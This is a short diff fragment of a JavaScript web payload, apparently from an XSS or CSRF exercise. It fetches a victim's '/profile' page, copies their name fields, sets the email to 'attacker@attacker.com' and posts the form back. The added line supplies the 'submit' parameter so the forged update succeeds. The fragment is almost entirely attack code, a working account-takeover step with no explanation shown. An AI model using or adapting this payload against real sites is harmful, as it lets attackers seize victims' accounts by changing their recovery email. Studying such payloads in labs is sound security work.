@@ -13,6 +13,8 @@ fetch('/profile')
     params.append('firstname', doc.querySelector('input[name="firstname"]').value);
     params.append('lastname', doc.querySelector('input[name="lastname"]').value);
     params.append('email', 'attacker@attacker.com');
+    params.append('submit', 'Submit');
+    
 
 
     fetch('/profile', {
